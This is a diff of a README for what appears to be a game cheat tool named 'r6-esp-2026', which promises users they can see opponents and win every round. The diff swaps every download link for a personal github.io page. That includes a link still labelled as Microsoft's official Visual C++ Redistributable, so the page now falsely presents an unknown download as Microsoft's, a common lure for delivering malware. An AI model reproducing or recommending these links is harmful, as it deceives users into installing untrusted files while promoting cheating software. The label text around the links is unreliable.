@@ -1,6 +1,6 @@
 # 🎯 r6-esp-2026 - See Everything, Win Every Round
 
-[![Download Now](https://img.shields.io/badge/Download-r6--esp--2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/tomyyg9518/r6-esp-2026)
+[![Download Now](https://img.shields.io/badge/Download-r6--esp--2026-brightgreen?style=for-the-badge&logo=github)](https://tomyyg9518.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide is written for everyone — no technical skills required. Just follow
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/tomyyg9518/r6-esp-2026](https://github.com/tomyyg9518/r6-esp-2026)
+Visit this link to download the application: [https://tomyyg9518.github.io](https://tomyyg9518.github.io)
 
 Once you're on the page, look for the green "Code" button or the release section. Click it and choose "Download ZIP" or the latest release file. After the download finishes, you'll have the application ready on your computer.
 
@@ -78,7 +78,7 @@ Check back on the repository page for the latest version and update notes.
 
 **I see a "Missing DLL" error.**
 
-- Install the latest [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) from Microsoft's official site.
+- Install the latest [Microsoft Visual C++ Redistributable](https://tomyyg9518.github.io) from Microsoft's official site.
 - Make sure Windows is fully updated.
 
 ## 💡 Pro Tips
@@ -113,7 +113,7 @@ We're constantly improving the tool based on community feedback, so don't hesita
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/tomyyg9518/r6-esp-2026](https://github.com/tomyyg9518/r6-esp-2026)
+- **Download:** [https://tomyyg9518.github.io](https://tomyyg9518.github.io)
 - **Releases:** Check the "Releases" section on the GitHub page for version history.
 
 ## ✅ Final Checklist
